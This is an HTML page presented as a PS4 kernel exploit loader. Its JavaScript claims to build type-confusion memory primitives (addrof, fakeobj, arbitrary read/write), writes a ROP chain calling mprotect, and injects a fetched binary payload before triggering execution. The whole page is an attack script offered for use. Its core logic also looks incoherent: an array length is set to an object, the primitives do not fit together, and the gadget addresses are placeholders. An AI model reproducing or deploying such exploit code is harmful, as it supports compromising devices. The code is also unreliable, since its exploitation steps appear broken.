<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PS4 Kernel Exploit Loader</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; padding: 10px; white-space: pre-wrap; }
    #log { max-height: 80vh; overflow-y: auto; }
  </style>
</head>
<body>
  <h1>Loader PS4 Kernel Exploit</h1>
  <div id="log">inicializando…</div>
  <script>
    const logEl = document.getElementById('log');
    function log(msg) {
      logEl.textContent += msg + "\n";
      logEl.scrollTop = logEl.scrollHeight;
    }

    // float↔int primitives
    const buf = new ArrayBuffer(8), f64 = new Float64Array(buf), u32 = new Uint32Array(buf);
    function f2i(f){ f64[0]=f; return BigInt(u32[0]) | (BigInt(u32[1])<<32n); }
    function i2f(i){ u32[0]=Number(i & 0xffffffffn); u32[1]=Number(i>>32n); return f64[0]; }

    // type-confusion gadget
    function makeCorruptArray() {
      let arr=[1.1,1.1,1.1];
      let trigger={ valueOf(){ arr.length=1; return 3; } };
      return arr.map((x,i,a)=>{ if(i===1) a.length=trigger; return x; });
    }

    let corrupt, addrof, fakeobj, arb_read, arb_write;
    function setupPrimitives() {
      log("[+] setupPrimitives()");
      corrupt = makeCorruptArray();
      let leak=f2i(corrupt[1]); log("    leak=0x"+leak.toString(16));
      let vb=new ArrayBuffer(0x2000), vf=new Float64Array(vb);
      corrupt[1]=i2f(leak);
      addrof=obj=>{ vf[0]=obj; return f2i(corrupt[1]); };
      fakeobj=addr=>{ corrupt[1]=i2f(addr); return new Float64Array(vb)[0]; };
      arb_read=addr=>{ corrupt[1]=i2f(addr); return f2i(vf[1]); };
      arb_write=(addr,val)=>{ corrupt[1]=i2f(addr); vf[1]=i2f(val); };
      log("    primitives ready");
    }

    let shellcodeAddr, rop;
    function buildROP(sc_buf) {
      log("[+] buildROP()");
      shellcodeAddr=f2i(corrupt[1]); log("    scbuf @0x"+shellcodeAddr.toString(16));
      // ← substitua por gadgets reais leakados no PS4
      let pop_rdi=0x10001000n, pop_rsi=0x10002000n, pop_rdx=0x10003000n, mprot=0x10004000n;
      rop=[ pop_rdi,shellcodeAddr,pop_rsi,0x1000n,pop_rdx,7n,mprot,shellcodeAddr ];
      let dv=new DataView(sc_buf);
      for(let i=0;i<rop.length;i++) dv.setBigUint64(i*8,rop[i],true);
      log("    ROPChain written");
      return rop.length;
    }

    async function loadAndTrigger() {
      log("[+] loadAndTrigger()");
      try {
        let res=await fetch("doublefree_test.bin");
        if(!res.ok) throw new Error(res.status);
        let payload=new Uint8Array(await res.arrayBuffer());
        log("    bin size="+payload.length+" bytes");

        // aloca buffer para ROPChain + payload
        let sc_buf=new ArrayBuffer(8*8 + payload.length);
        let offset=buildROP(sc_buf)*8;
        let dv=new DataView(sc_buf);
        for(let i=0;i<payload.length;i++) dv.setUint8(offset+i,payload[i]);
        log("    bin injected, triggering...");

        // pivot to ROPChain → payload
        fakeobj(shellcodeAddr);
      } catch(e) {
        log("!!! error: "+e);
      }
    }

    setTimeout(()=>{
      log("=== Exploit start ===");
      setupPrimitives();
      loadAndTrigger().then(()=>log("=== done ==="));
    },1000);
  </script>
</body>
</html>
